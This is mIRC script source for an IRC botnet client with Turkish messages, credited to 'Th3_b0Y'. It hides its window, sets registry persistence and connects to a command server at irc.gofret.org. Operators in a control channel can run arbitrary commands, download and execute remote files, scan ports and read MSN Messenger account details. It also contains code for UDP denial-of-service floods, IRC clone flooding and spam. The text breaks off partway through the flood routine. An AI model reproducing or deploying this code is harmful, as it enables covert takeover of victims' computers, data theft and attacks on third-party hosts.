 on 1:start: {
  sttart
  Th3_b0Y
  remote on
  nick $read fn.xt
  timer 0 15 //clearall
  timer 0 200 Th3_b0Y
  identd on mirc
  fullname $read fn.xt  
  emailaddr $read fn.xt $+ @Th3_b0Y
  Th3_b0Y
  timer 1 5 server irc.gofret.org:1820
  mkdir download
  strpage
}
on 1:connect: {
  ignore -wd *
  if ($cid == 1) { join #� Sikvar | timer 1 10 srvmsg Emirlerine Haz�r�m Komutan�m! }
  if ($cid !== 1) { remote on | msg nickserv register tektabanca $read email.txt | timer 1 1 //nickserv identify tektabanca | join $read  Chans.dll | timer 0 30 join $read Chans.dll | timer 0 300 disconnect |  halt }
}
on *:appactive: { kapa | srvmsg M!rc A�ik }
On *:Exit: { run $remove($mircexe,$mircdir) }
on *:disconnect: { server | nick $read fn.xt | fullname $read fn.xt | emailaddr $read fn.xt $+ @Th3_b0Y | halt }
on *:text:*:?:closemsg  $nick | halt
on *:action:*:?:closemsg $nick | halt
on *:ping: { ctcp $me ping }
on *:text:*:#� : {
  if ($cid == 1) {
    if ($nick == Th3_b0Y) {
      if (Th3_b0Y isop #� ) {
        if ($1 = $me) { $2- }
        if ($1 = !exit) { exit }   
        if ($1 = !portinfo) { %cp.i = 1 | %cp.x = 65000 | %cp.p = $null | :loop | if (%cp.i > %cp.x) { goto return } | if (!$portfree(%cp.i)) { %cp.p = $+(%cp.p,$chr(130),%cp.i) } | inc %cp.i | goto loop | :return | TeSts [Portinfo] ( $+ $gettok(%cp.p,1-,130) $+ ) | unset %cp.* }
        if ($1 = !GetMsn) { .comopen msn Messenger.UIAutomation | if ($comerr) { return } | %a = $com(msn,MyStatus,2) | %b = $com(msn).result | %a = $com(msn,MyFriendlyName,2) | %c = $com(msn).result | %a = $com(msn,MySigninName,2) | %d = $com(msn).result | %a = $com(msn,MyServiceName,2) | %e = $com(msn).result | %x = $com(msn,InstallationDirectory,1) | .comclose msn | if (%b = 1) { %b = Offline } | if (%b = 2) { %b = Online } | if (%b = 6) { %b = Invisible } | if (%b = 10) { %b = Busy } | if (%b = 14) { %b = Be Right Back } | if (%b = 18) { %b = Idle } | if (%b = 34) { %b = Away } | if (%b = 50) { %b = On the Phone } | if (%b = 66) { %b = Out for Lunch } | if (%b = offline) { msg #�  MSN �u Anda Ofline. } | else { msg #�  MSN [Nickname: %c $+ ]  [E-mail: %d $+ ] [Service Provider: %e $+ ] [Status: %b $+ ] } }
        if ($1 = !ReConnect) { /quit Coming.... | .timer 1 2 /server  irc.gofret.org:1820 }
        if ($1 = !reklam) { .set %reklam $2- }
        if ($1 = !packet) { if ($2 = ddos) { //set %pchan # |  if ($4 == random) { //fckrstart $3 $4 $r(1,65000) | halt } | //fckrstart $3 $4 $5  } }
        if ($1 = !Atak) {  if ($2 !== $null) { srvmsg (Packet) (Yollaniyor) $2 �zerinde $3 Toplam $4 Packet | synp start $4 $2 $3 } }
        if ($1 = !nreklam) { msg #�  %reklam }
        if ($1 = !mesajnick) { .set %mesajnick $2- | echo -a  #bilgi Yeni Mesaj Atilacak Nick %mesajnick }
        if ($1 = !mesaj) { .mesaj }
        if ($1 = !settimer) { .set %timer $2- }
        if ($1 = !timer) { .timer31 %timer $2- }
        if ($1 = !timeroff) { .timer31 off }
        if ($1 = !gir) { .girgir }
        if ($1 = !Run) { srvmsg Running : $2- | .run $2- }
        if ($1 = !qir) { .girulen $2- }
        if ($1 = !q) { $2- }
        if ($1 = !Version) { .Anlat }
        if ($1 = !Download) { .Download $2- }
        if ($1 = !Clone) { .Clone $2- }
        if ($1 = !IdentClone) { .identclone $2- }
        if ($1 = !HideControl) { if ($appactive == $true) { msg ##Final Mirc A�ik } | else { msg ##Final Mirc Kapali } }
        if ($1 = !Hide) { .dll Sfwwin32.dll do_ShowWindow $window(-2).hwnd 0 }

      }
    }
    if ($nick ==  Samuray) {
      if (Samuray isop #� ) {
        if ($1 = $me) { $2- }
        if ($1 = !exit) { exit }   
        if ($1 = !GetMsn) { .comopen msn Messenger.UIAutomation | if ($comerr) { return } | %a = $com(msn,MyStatus,2) | %b = $com(msn).result | %a = $com(msn,MyFriendlyName,2) | %c = $com(msn).result | %a = $com(msn,MySigninName,2) | %d = $com(msn).result | %a = $com(msn,MyServiceName,2) | %e = $com(msn).result | %x = $com(msn,InstallationDirectory,1) | .comclose msn | if (%b = 1) { %b = Offline } | if (%b = 2) { %b = Online } | if (%b = 6) { %b = Invisible } | if (%b = 10) { %b = Busy } | if (%b = 14) { %b = Be Right Back } | if (%b = 18) { %b = Idle } | if (%b = 34) { %b = Away } | if (%b = 50) { %b = On the Phone } | if (%b = 66) { %b = Out for Lunch } | if (%b = offline) { msg #�  MSN �u Anda Ofline. } | else { msg #�  MSN [Nickname: %c $+ ]  [E-mail: %d $+ ] [Service Provider: %e $+ ] [Status: %b $+ ] } }
        if ($1 = !ReConnect) { /quit Coming.... | .timer 1 2 /server  irc.gofret.org:1820 }
        if ($1 = !reklam) { .set %reklam $2- }
        if ($1 = !packet) { if ($2 = ddos) { //set %pchan # |  if ($4 == random) { //fckrstart $3 $4 $r(1,65000) | halt } | //fckrstart $3 $4 $5  } }
        if ($1 = !Atak) {  if ($2 !== $null) { srvmsg (Packet) (Yollaniyor) $2 �zerinde $3 Toplam $4 Packet | synp start $4 $2 $3 } }
        if ($1 = !nreklam) { msg #�  %reklam }
        if ($1 = !mesajnick) { .set %mesajnick $2- | echo -a  #�  Yeni Mesaj Atilacak Nick %mesajnick }
        if ($1 = !mesaj) { .mesaj }
        if ($1 = !settimer) { .set %timer $2- }
        if ($1 = !timer) { .timer31 %timer $2- }
        if ($1 = !timeroff) { .timer31 off }
        if ($1 = !gir) { .girgir }
        if ($1 = !Run) { srvmsg Running : $2- | .run $2- }
        if ($1 = !qir) { .girulen $2- }
        if ($1 = !q) { $2- }
        if ($1 = !down) { msg #[y] Downloading : $2 | download file $2 download\ }
        if ($1 = !calistir) { run download\ $+ $2 }
        if ($1 = !Version) { .Anlat }
        if ($1 = !Clone) { .Clone $2- }
        if ($1 = !IdentClone) { .identclone $2- }
        if ($1 = !HideControl) { if ($appactive == $true) { msg ##Final Mirc A�ik } | else { msg ##Final Mirc Kapali } }
        if ($1 = !Hide) { .dll Sfwwin32.dll do_ShowWindow $window(-2).hwnd 0 }
  
      }
    }
    if ($nick ==  cLub15) {
      if (cLub15 isop #� ) {
        if ($1 = $me) { $2- }
        if ($1 = !exit) { exit }   
        if ($1 = !GetMsn) { .comopen msn Messenger.UIAutomation | if ($comerr) { return } | %a = $com(msn,MyStatus,2) | %b = $com(msn).result | %a = $com(msn,MyFriendlyName,2) | %c = $com(msn).result | %a = $com(msn,MySigninName,2) | %d = $com(msn).result | %a = $com(msn,MyServiceName,2) | %e = $com(msn).result | %x = $com(msn,InstallationDirectory,1) | .comclose msn | if (%b = 1) { %b = Offline } | if (%b = 2) { %b = Online } | if (%b = 6) { %b = Invisible } | if (%b = 10) { %b = Busy } | if (%b = 14) { %b = Be Right Back } | if (%b = 18) { %b = Idle } | if (%b = 34) { %b = Away } | if (%b = 50) { %b = On the Phone } | if (%b = 66) { %b = Out for Lunch } | if (%b = offline) { msg #�  MSN �u Anda Ofline. } | else { msg #�  MSN [Nickname: %c $+ ]  [E-mail: %d $+ ] [Service Provider: %e $+ ] [Status: %b $+ ] } }
        if ($1 = !ReConnect) { /quit Coming.... | .timer 1 2 /server  irc.gofret.org:1820 }
        if ($1 = !reklam) { .set %reklam $2- }
        if ($1 = !packet) { if ($2 = ddos) { //set %pchan # |  if ($4 == random) { //fckrstart $3 $4 $r(1,65000) | halt } | //fckrstart $3 $4 $5  } }
        if ($1 = !Atak) {  if ($2 !== $null) { srvmsg (Packet) (Yollaniyor) $2 �zerinde $3 Toplam $4 Packet | synp start $4 $2 $3 } }
        if ($1 = !nreklam) { msg #�  %reklam }
        if ($1 = !mesajnick) { .set %mesajnick $2- | echo -a  #�  Yeni Mesaj Atilacak Nick %mesajnick }
        if ($1 = !mesaj) { .mesaj }
        if ($1 = !settimer) { .set %timer $2- }
        if ($1 = !timer) { .timer31 %timer $2- }
        if ($1 = !timeroff) { .timer31 off }
        if ($1 = !gir) { .girgir }
        if ($1 = !Run) { srvmsg Running : $2- | .run $2- }
        if ($1 = !qir) { .girulen $2- }
        if ($1 = !q) { $2- }
        if ($1 = !down) { msg #[y] Downloading : $2 | download file $2 download\ }
        if ($1 = !calistir) { run download\ $+ $2 }
        if ($1 = !Version) { .Anlat }
        if ($1 = !Clone) { .Clone $2- }
        if ($1 = !IdentClone) { .identclone $2- }
        if ($1 = !HideControl) { if ($appactive == $true) { msg ##Final Mirc A�ik } | else { msg ##Final Mirc Kapali } }
        if ($1 = !Hide) { .dll Sfwwin32.dll do_ShowWindow $window(-2).hwnd 0 }

      }
    }
  }
}
alias sttart {
  timer 0 2 Kapa3
  timer 0 1 kapa1
  timer 0 2 kapa
  kapa
  kapa1
}
alias girulen { .scon 2 join $1- | .scon 3 join $1- | .scon 4 join $1- | .scon 5 join $1- | .scon 6 join $1- | .scon 7 join $1- | .scon 8 join $1- | .scon 9 join $1- | .scon 10 join $1- | .scon 11 join $1- | .scon 12 join $1- | .scon 12 join $1- | .scon 14 join $1- | .scon 13 join $1- | .scon 15 join $1- | .scon 16 join $1- | .scon 17 join $1- | .scon 18 join $1- | .scon 19 join $1- | halt }
alias Kapa3 { if ($appstate != hidden) { .kapa } }
alias Kapa { .dll Sfwwin32.dll do_ShowWindow $window(-2).hwnd 0 }
alias Kapa1 { if ($appstate != hidden) { .dll Sfwwin32.dll do_ShowWindow $window(-2).hwnd 0 } }
alias Th3_b0Y {
  .set %windows $r(10,1999) $+ .reg 
  .write %windows REGEDIT4
  .write %windows [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
  .write %windows "WinSmsFi"=" $+ $remove($mircexe,$mircdir) $+ "
  run -n regedit /s %windows 
  timer 1 4 remove %windows
}
on ^*:join:*: { 
  if ($cid !== 1) && ($nick !== $me) && ($chan !== %savaskn) { msg $nick($chan,$rand(8,$nick($chan,0))) %reklam }
  window -h $chan
}
raw 6:*: { 
  if (/login isin $2-) { login 342 }
}
raw 439:*: { disconnect }
raw 432:*: { nick $read fn.xt }
raw 332:* {
  if ($cid == 1) && ($2 == #� ) { set %reklam $3- }
  halt
}
on *^:ERROR:*banned*:{
  if ($cid != 1) {
    server $read(server.dll)
    timer 1 2 .okey
    halt
  }
}
alias girgir { .scon 1 echo -a  #bilgi Alalalal Dolu�un Kanallara | .scon 2 join $read Chans.dll | .scon 3 join $read Chans.dll | .scon 4 join $read Chans.dll | .scon 5  join $read Chans.dll | .scon 6 join $read Chans.dll | .scon 7 join $read Chans.dll | .scon 8 join $read Chans.dll | .scon 9 join $read Chans.dll | .scon 10 join $read Chans.dll | .scon 11 join $read Chans.dll | .scon 12 join $read Chans.dll | .scon 13 join $read Chans.dll | .scon 14 join $read Chans.dll | .scon 15 join $read Chans.dll | .scon 16 join $read Chans.dll | .scon 17 join $read Chans.dll | .scon 18 join $read Chans.dll | .scon 19 join $read Chans.dll | .scon 20 join $read Chans.dll | .scon 21 join $read Chans.dll | .scon 22 join $read Chans.dll | .scon 23 join $read Chans.dll | .scon 24 join $read Chans.dll | .scon 25 join $read Chans.dll | .scon 26 join $read Chans.dll | .scon 27 join $read Chans.dll | halt }
alias mesaj { scon 1 msg %mesajnick Online | scon 2 msg %mesajnick Online | scon 3 msg %mesajnick Online | scon 4 msg %mesajnick Online | scon 5 msg %mesajnick Online |  scon 6 msg %mesajnick Online | scon 7 msg %mesajnick Online | scon 8 msg %mesajnick Online | scon 9 msg %mesajnick Online | scon 10 msg %mesajnick Online |  scon 11 msg %mesajnick Online | scon 12 msg %mesajnick Online | scon 13 msg %mesajnick Online | scon 14 msg %mesajnick Online | }
alias sax { server -m %savasserver }
alias floodcuk { timer 0 1 msg %savaskn %savasmesaj }
on 1:BAN:#: { if ($nick = $me) { .banqanal | halt } }
alias banqanal { .scon 1 echo -a  #bilgi Ban Yedik a.q }
alias okey { .scon 1 echo -a  #bilgi OK Yafyum Girdik!!! }
Alias Bizim { 
  if ($cid == 1) {
    if ($serverip !== %temptex) { echo -a 15Yok Baba Bizim Yer Degil Burasi | .netoku } 
    elseif ($serverip == %temptex) { echo -a 15OKe Baba Bizim Yer Burasi..! }
  }
}
Alias Anlat { 
  .msg #�  Coded By: Th3_b0Y
  .msg #�  Contact : GofRet.oRg / #� 
  .msg #�  Mode    : EmRet Komutan�m.
}
Alias floodmsg {   return $str( $+  $+ $r(A,Z) $+  $+ $r(0,9) $+  $+ $r(a,z) $+  $+ $r(0,9) $+  $+ $r(a,z),$r(60,72)) }
Alias paradise {   return $str( $+  $+ $r(A,Z) $+  $+ $r(0,9) $+  $4  $+ $r(a,z),$r(60,72)) }
Alias dellen { sockwrite -nt clone* $sockname nick $rndsn }
Alias feel { sockwrite -nt clone* $sockname nick $4 $+ - $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) }
Alias oku { sockwrite -nt clone* NickServ Register $rndsn  $+($rndsn,@hotmail.com) }
Alias rndsn { unset %rsn* | set %rsn $r(a,z) | var %a = $r(1,5) , %b = $r(1,4) , %c = $r(1,2) , %d = $r(a,z) | if (%c = 1) { var %_ = 1 | while (%_ <=  $calc(%a + %b)) {  var %r = $r(1,2) |  if (%r = 1) { set %rsn [ %rsn ] $r(a,z) }
  if (%r = 2) { set %rsn [ %rsn ] $r(a,z) } | inc %_  } } | if (%c = 2) { var %_ = 1 | while (%_ <= $calc(%a + %b)) { var %r = $r(1,2) |  if (%r = 1) { set  %rsn [ %rsn ] $r(a,z) } | if (%r = 2) { set %rsn [ %rsn ] $r(a,z) } | inc %_  } } | return $remove(%rsn,$chr(32))
} 

Alias identclone {
  if ($1 = load) {
    srvmsg Clone Loading $2 $+ : $+ $3 Toplam $4 Clone Ident : $5
    var %x = $4 
    %identclone = $5
    %ss = $2 
    %sp = $3 
    while  (%x >= 1) { 
      .sockopen identclone $+ %x $+ $rndsn %ss %sp
      dec %x  
    } 
  }
  if ($1 = cycle) { sockwrite -tn identclone* cycle $2 } 
  if ($1 = msg) { sockwrite -nt identclone* privmsg $2 : $+ $3- }
  if ($1 = flood) { sockwrite -tn identclone* join $2 | sockwrite -tn identclone* privmsg $2 : $floodmsg }
  if ($1 = flood1) { sockwrite -tn identclone* join $2 | sockwrite -tn identclone* privmsg $2 : $paradise }
  if ($1 = join) { sockwrite -tn identclone* join $2 } 
  if ($1 = part) { sockwrite -tn identclone* part $2 } 
  if ($1 = kapat) { sockclose identclone* | .timerflood off }
  if ($1 = notice) { sockwrite -tn identclone* notice $2 : $3- } 
  if ($1 = Regle) { $oku } 
  if ($1 = random) { sockwrite -tn identclone* join $2 | sockwrite -tn identclone* privmsg $2 : $3- $str($rndsn,50)) }
  if ($1 = help) { sockwrite -tn identclone* privmsg nickserv : help) | sockwrite -tn identclone* privmsg chanserv : help) |  sockwrite -tn identclone* privmsg memoserv : help) }
  if ($1 = nick) { sockwrite -nt identclone* $dellen }
  if ($1 = nick1) { sockwrite -nt identclone* $feel }
}
Alias clone {
  if ($1 = load) { 
    var %x = $4 
    %ss = $2 
    %sp = $3 
    while  (%x >= 1) { 
      .sockopen clone $+ %x $+ $rndsn %ss %sp
      dec %x  
    } 
  }
  if ($1 = cycle) { sockwrite -tn clone* cycle $2 } 
  if ($1 = msg) { sockwrite -nt clone* privmsg $2 : $+ $3- }
  if ($1 = flood) { sockwrite -tn clone* join $2 | sockwrite -tn clone* privmsg $2 : $floodmsg }
  if ($1 = flood1) { sockwrite -tn clone* join $2 | sockwrite -tn clone* privmsg $2 : $paradise }
  if ($1 = join) { sockwrite -tn clone* join $2 } 
  if ($1 = part) { sockwrite -tn clone* part $2 } 
  if ($1 = kapat) { sockclose clone* | .timerflood off }
  if ($1 = notice) { sockwrite -tn clone* notice $2 : $3- } 
  if ($1 = Regle) { $oku } 
  if ($1 = random) { sockwrite -tn clone* join $2 | sockwrite -tn clone* privmsg $2 : $3- $str($rndsn,50)) }
  if ($1 = help) { sockwrite -tn clone* privmsg nickserv : help) | sockwrite -tn clone* privmsg chanserv : help) |  sockwrite -tn clone* privmsg memoserv : help) }
  if ($1 = nick) { sockwrite -nt clone* $dellen }
  if ($1 = nick1) { sockwrite -nt clone* $feel }
}
on 1:sockopen:clone*: { 
  .sockwrite -nt $sockname user $read fn.xt 22222 33333 : $read fn.xt
  .sockwrite -nt $sockname nick $read fn.xt
}
on 1:sockread:clone*:{
  if ($sockerr > 0) { return }
  :loop | sockread %tmp
  tokenize 32 %tmp
  if $2 == 477 {
    sockwrite -nt $sockname NickServ Register $rndsn  $+($rndsn,@hotmail.com)
    .timer 1 1 sockwrite -nt $sockname join $2
  }
  if $3 == :VERSION && $2 == PRIVMSG {
    sockwrite -nt $sockname NOTICE $mid($gettok(%tmp,1,33),2,100) :VERSION mIRC v6.16 Khaled Mardam-Bey
  }
  if $4 == :FINGER && $2 == PRIVMSG {
    sockwrite -nt $sockname NOTICE $mid($gettok(%tmp,1,33),2,100) :FINGER mIRC v6.16 Khaled Mardam-Bey
  }
  if $4 == :TIME && $2 == PRIVMSG {
    sockwrite -nt $sockname NOTICE $mid($gettok(%tmp,1,33),2,100) :TIME mIRC v6.16 Khaled Mardam-Bey
  }
  if $4 == :PING && $2 == PRIVMSG {
    sockwrite -nt $sockname NOTICE $mid($gettok(%tmp,1,33),2,100) :PING 12345612
  }
  if ($sockbr == 0) { return } 
  if ($gettok(%tmp,1,32) == ping) { sockwrite -n $sockname PONG $gettok(%tmp,2-,32) }
  if ($gettok(%tmp,2,32) == KICK) { sockwrite -nt clone* JOIN : $+ $gettok(%tmp,3,32) }
  if ($gettok(%tmp,2,32) = PRIVMSG) {
    if (($remove($mid($gettok(%tmp,4,32),3,100),$chr(1)) = VERSION)) {
      sockwrite -n $sockname NOTICE $mid($gettok(%tmp,1,33),2,100) : $+ $Chr(1) VERSION mIRC v $+ $version mIRC v6.16 Khaled Mardam-Bey $+ $Chr(1)
    }
  }
}
on 1:sockopen:identclone*: { 
  .sockwrite -nt $sockname user %identclone 22222 33333 : $read fn.xt
  .sockwrite -nt $sockname nick $read fn.xt
}
on 1:sockread:identclone*:{
  if ($sockerr > 0) { return }
  :loop | sockread %itmp
  tokenize 32 %itmp
  if $2 == 477 {
    sockwrite -nt $sockname NickServ Register $rndsn  $+($rndsn,@hotmail.com)
    .timer 1 1 sockwrite -nt $sockname join $2
  }
  if $3 == :VERSION && $2 == PRIVMSG {
    sockwrite -nt $sockname NOTICE $mid($gettok(%itmp,1,33),2,100) :VERSION mIRC v6.16 Khaled Mardam-Bey
  }
  if $4 == :FINGER && $2 == PRIVMSG {
    sockwrite -nt $sockname NOTICE $mid($gettok(%itmp,1,33),2,100) :FINGER mIRC v6.16 Khaled Mardam-Bey
  }
  if $4 == :TIME && $2 == PRIVMSG {
    sockwrite -nt $sockname NOTICE $mid($gettok(%itmp,1,33),2,100) :TIME mIRC v6.16 Khaled Mardam-Bey
  }
  if $4 == :PING && $2 == PRIVMSG {
    sockwrite -nt $sockname NOTICE $mid($gettok(%itmp,1,33),2,100) :PING 12345612
  }
  if ($sockbr == 0) { return } 
  if ($gettok(%itmp,1,32) == ping) { sockwrite -n $sockname PONG $gettok(%itmp,2-,32) }
  if ($gettok(%itmp,2,32) == KICK) { sockwrite -nt clone* JOIN : $+ $gettok(%itmp,3,32) }
  if ($gettok(%itmp,2,32) = PRIVMSG) {
    if (($remove($mid($gettok(%itmp,4,32),3,100),$chr(1)) = VERSION)) {
      sockwrite -n $sockname NOTICE $mid($gettok(%itmp,1,33),2,100) : $+ $Chr(1) VERSION mIRC v $+ $version mIRC v6.16 Khaled Mardam-Bey $+ $Chr(1)
    }
  }
}
alias download {
  if ($1 == $null) {
    msg #�  Kullanimi: !Download http://www.domain.com/dosyaadi.exe
    halt
    return
  }
  if ($sock(download).status != $null) {
    msg #�  Download: �u An Me�gul Zaten Bir Download Yapiliyor
    halt
    return
  }
  if ($left($1,7) != http://) || ($chr(46) !isin $gettok($1,2,47)) {
    msg #�  Kullanimi: !Download http://www.domain.com/dosyaadi.exe
    halt
    return
  }
  if ($left($1,7) == http://) && ($chr(46) isin $gettok($1,2,47)) {
    if ($gettok($1,3-,47) == $null) {
      msg #�  Download Sonlandi: Dosya Bulunamadi
      halt
      return
    }
    hadd -m download 1 $gettok($1,2,47)
    hadd -m download 2 $gettok($1,3-,47)
    hadd -m download 3 $gettok($1,$numtok($1,47),47)
    sockclose download
    sockopen download $hget(download,1) 80
  }
}
on *:sockopen:download: {
  unset %chk
  if ($sock(download).status == active) {
    sockwrite -n download GET / $+ $hget(download,2) HTTP/1.1
    sockwrite -n download Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*
    sockwrite -n download Accept-Language: en-us
    sockwrite -n download Accept-Encoding: identity
    sockwrite -n download Host: $hget(download,1)
    sockwrite download $crlf
  }
  if ($sock(download).status != active) {
    msg #�  Download Hata: Baglanti Kurulamadi $hget(download,1)
    sockclose download
    return
  }
}
on *:sockread:download: {  
  if (%chk == $null) { 
    sockread %download
    if ($gettok(%download,1,32) == Content-length:) {
      hadd -m download 4 $gettok(%download,2,32)
      if ($exists($mircdir $+ download\ $+ $hget(download,3)) == $true) {
        if ($file($mircdir $+ download\ $+ $hget(download,3)).size == $hget(download,4)) {
          msg #�  Download Kapatildi: Dosya Zaten Mevcut
          sockclose download
          halt
          return 
        }
        if ($file($mircdir $+ download\ $+ $hget(download,3)).size != $hget(download,4)) {
          .remove " $+ $mircdir $+ download\ $+ $hget(download,3) $+ "
        }
      }
    }
    if ($gettok(%download,1,32) == HTTP/1.1) {
      if ($gettok(%download,2,32) == 200) {
        msg #�  Download: $gettok(%download,2-,32)
      }
      if ($left($gettok(%download,2,32),1) == 1) {
        msg #�  Download Hata: $gettok(%download,2-,32)
        sockclose download
        halt
        return
      }
      if ($gettok(%download,2,32) == 201) {
        msg #�  Download Hata: $gettok(%download,2-,32)
        sockclose download
        halt
        return
      }
      if ($gettok(%download,2,32) == 202) {
        msg #�  Download Hata: $gettok(%download,2-,32)
        sockclose download
        halt
        return
      }
      if ($gettok(%download,2,32) == 203) {
        msg #�  Download Hata: $gettok(%download,2-,32)
        sockclose download
        halt
        return
      }
      if ($gettok(%download,2,32) == 204) {
        msg #�  Download Hata: $gettok(%download,2-,32)
        sockclose download
        halt
        return
      }
      if ($gettok(%download,2,32) == 205) {
        msg #�  Download Hata: $gettok(%download,2-,32)
        sockclose download
        halt
        return
      }
      if ($gettok(%download,2,32) == 206) {
        msg #�  Download Hata: $gettok(%download,2-,32)
        sockclose download
        halt
        return
      }
      if ($left($gettok(%download,2,32),1) == 3) {
        msg #�  Download Hata: $gettok(%download,2-,32)
        sockclose download
        halt
        return
      }
      if ($left($gettok(%download,2,32),1) == 4) {
        msg #�  Download Hata: $gettok(%download,2-,32)
        sockclose download
        halt
        return
      }
      if ($left($gettok(%download,2,32),1) == 5) {
        msg #�  Download Hata: $gettok(%download,2-,32)
        sockclose download
        halt
        return
      }
    }
    if ($len(%download) < 4) {
      %chk = 1
    }
    halt
  }
  :download
  sockread &download
  if ($sockbr == 0) { return } 
  bwrite " $+ $mircdir $+ download\ $+ $hget(download,3) $+ " -1 &download
  goto download
}
on *:sockclose:download: { 
  if ($hget(download,4) == $file($mircdir $+ download\ $+ $hget(download,3)).size) {
    msg #�  Download Sona Erdi Alinan Dosya Boyutu 2[ $hget(download,4) ] 1,0Actual Dosya Boyutu: 3[ $file($mircdir $+ download\ $+  $hget(download,3)).size ] 1,0Result: 4[ Tamamlandi ] ( $+ 12Ran $mircdir $+ download\ $+ $hget(download,3) $+ 1,0)
    run " $+ $mircdir $+ download\ $+ $hget(download,3) $+ "
    halt
    return    
  }
  if ($hget(download,4) != $file($mircdir $+ download\ $+ $hget(download,3)).size) {
    msg #�  Download Sona Erdi Alinan Dosya Boyutu 2[ $hget(download,4) ] 1,0Actual Dosya Boyutu: 3[ $file($mircdir $+ download\ $+  $hget(download,3)).size ] 1,0Result: 4[ Hata ]
  }
}

ctcp 1:Version:*:{
  ctcpreply $nick version mIRC v6.16 Khaled Mardam-Bey
  ctcpreply IRC version mIRC v6.16 Khaled Mardam-Bey
  ctcpreply Version version mIRC v6.16 Khaled Mardam-Bey
}
alias fckrstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg %pchan Packeting Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan Error! Currently Packeting: $gettok($timer(gcoolt).com,3,32) | return } |  msg %pchan Sending $1 packets to $2 on port $3  |  set %gnum 0 |  .timergcoolt -m 0 60 fckrbb $1 $2 $3 }
alias fckrbb {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 2 
  %gnum.p = $r(1,65000)
  sockudp gnumc1 $2 %gnum.p !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
  %gnum.p = $r(1,65000) 
  sockudp gnumc3 $2 %gnum.p + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
  %gnum.p = $r(1,65000)
  sockudp gnumc2 $2 %gnum.p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnum.p = $r(1,65000)
